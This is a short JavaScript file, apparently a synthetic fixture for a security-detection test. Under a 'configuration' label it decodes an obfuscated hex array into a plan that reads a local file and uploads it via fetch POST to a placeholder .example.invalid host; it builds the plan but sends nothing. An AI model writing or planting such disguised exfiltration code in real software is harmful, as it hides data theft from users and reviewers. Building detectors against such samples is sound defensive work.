// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_fc5b1a31 = "[\"8b\",\"52\",\"46\",\"91\",\"88\",\"89\",\"7a\",\"85\",\"88\",\"52\",\"87\",\"7a\",\"76\",\"79\",\"74\",\"7b\",\"7e\",\"81\",\"7a\",\"41\",\"89\",\"87\",\"76\",\"83\",\"88\",\"82\",\"7e\",\"89\",\"74\",\"87\",\"7a\",\"82\",\"84\",\"89\",\"7a\",\"91\",\"76\",\"79\",\"76\",\"85\",\"89\",\"7a\",\"87\",\"52\",\"7b\",\"7a\",\"89\",\"78\",\"7d\",\"74\",\"85\",\"84\",\"88\",\"89\",\"91\",\"88\",\"89\",\"76\",\"7c\",\"7a\",\"74\",\"78\",\"84\",\"8a\",\"83\",\"89\",\"52\",\"46\",\"91\",\"78\",\"76\",\"82\",\"85\",\"76\",\"7e\",\"7c\",\"83\",\"74\",\"7e\",\"79\",\"52\",\"63\",\"64\",\"59\",\"5a\",\"42\",\"57\",\"46\",\"58\",\"57\",\"56\",\"5a\",\"4b\",\"59\",\"91\",\"8a\",\"87\",\"81\",\"52\",\"7d\",\"89\",\"89\",\"85\",\"88\",\"4f\",\"44\",\"44\",\"83\",\"84\",\"79\",\"7a\",\"42\",\"77\",\"46\",\"78\",\"77\",\"76\",\"7a\",\"4b\",\"79\",\"78\",\"48\",\"46\",\"48\",\"43\",\"7a\",\"8d\",\"76\",\"82\",\"85\",\"81\",\"7a\",\"43\",\"7e\",\"83\",\"8b\",\"76\",\"81\",\"7e\",\"79\",\"44\",\"76\",\"85\",\"7e\",\"91\",\"8a\",\"88\",\"7a\",\"87\",\"74\",\"76\",\"7c\",\"7a\",\"83\",\"89\",\"52\",\"63\",\"84\",\"79\",\"7a\",\"56\",\"8a\",\"79\",\"7e\",\"89\",\"44\",\"77\",\"46\",\"78\",\"77\",\"91\",\"7b\",\"7e\",\"81\",\"7a\",\"74\",\"85\",\"76\",\"89\",\"7d\",\"52\",\"44\",\"89\",\"82\",\"85\",\"44\",\"7d\",\"8a\",\"83\",\"89\",\"87\",\"7a\",\"88\",\"88\",\"42\",\"83\",\"84\",\"79\",\"7a\",\"44\",\"43\",\"88\",\"89\",\"76\",\"7c\",\"7a\",\"42\",\"77\",\"46\",\"78\",\"77\",\"76\",\"7a\",\"4b\",\"79\",\"78\",\"48\",\"46\",\"48\",\"43\",\"82\",\"7f\",\"88\"]";
const Codec_fc5b1a31 = "hex_array|add_modulo_256|15";

function load_fc5b1a31() { return JSON.parse(Material_fc5b1a31).map((value) => Number.parseInt(value, 16)); }
function decode_fc5b1a31(storedBytes) { return storedBytes.map((value) => (value - 21 + 256) & 255); }
async function recover_fc5b1a31() {
  const [harmlessValue] = ["compass"];
  const storedBytes = load_fc5b1a31(); let recoveredBytes = [];
  recoveredBytes = await (async () => decode_fc5b1a31(storedBytes))();
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_fc5b1a31() { return JSON.parse(JSON.stringify({ value: await recover_fc5b1a31() })).value; }
async function plan_fc5b1a31() { const inspect = inspect_fc5b1a31; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_fc5b1a31;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_fc5b1a31());

// reconstruction complete